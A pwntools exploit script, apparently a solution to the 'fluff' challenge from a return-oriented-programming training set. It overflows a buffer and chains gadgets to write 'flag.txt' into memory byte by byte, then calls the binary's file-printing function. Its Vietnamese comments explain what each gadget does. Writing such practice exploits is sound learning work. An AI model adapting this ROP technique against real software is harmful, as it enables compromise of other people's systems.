from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./fluff', checksec=False)

p = process("./fluff")

gdb.attach(p, gdbscript='''
b*pwnme+152
c
''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
pop_r14_r15 = ROP(elf).find_gadget(["pop r14", "pop r15", "ret"])[0]
pop_r12_r13_r14_r15 = 0x000000000040069c
vuln = elf.sym['usefulFunction']
gadget = elf.sym['questionableGadgets']
xtos = gadget + 17 			#Luu gia tri cua al vao [rdi]
xlat = gadget + 0			#Luu ky tai [rbx+al] vao lai al  
pop_rdx_rcx_addrcx = gadget + 2 	#add rcx,0x3ef2 roi luu vao rbx 

f_char = 0x4003c4
l_char = 0x400239
a_char = 0x4003d6
g_char = 0x4003cf
dot_char = 0x40024e
x_char = 0x400246
t_char = 0x4003d5

null_addr = 0x6010f0             
   
payload1 = flat(#rdx , rcx , addrcx
	cyclic(0x28),
	pop_rdx_rcx_addrcx,
	0x3000,
	f_char-0x3ef2-0xb,
	xlat,
	pop_rdi_ret,
	null_addr,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	l_char-0x3ef2-0x66,
	xlat,
	pop_rdi_ret,
	null_addr + 1,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	a_char-0x3ef2-0x6c,
	xlat,
	pop_rdi_ret,
	null_addr + 2,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	g_char-0x3ef2-0x61,
	xlat,
	pop_rdi_ret,
	null_addr + 3,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	dot_char-0x3ef2-0x67,
	xlat,
	pop_rdi_ret,
	null_addr + 4,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	t_char-0x3ef2-0x2e,
	xlat,
	pop_rdi_ret,
	null_addr + 5,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	x_char-0x3ef2-0x74,
	xlat,
	pop_rdi_ret,
	null_addr + 6,
	xtos,
	
	pop_rdx_rcx_addrcx,
	0x3000,
	t_char-0x3ef2-0x78,
	xlat,
	pop_rdi_ret,
	null_addr + 7,
	xtos,
	
	pop_rdi_ret,
	null_addr,
	vuln+9	
    )

p.sendlineafter(b">",payload1)
p.interactive()
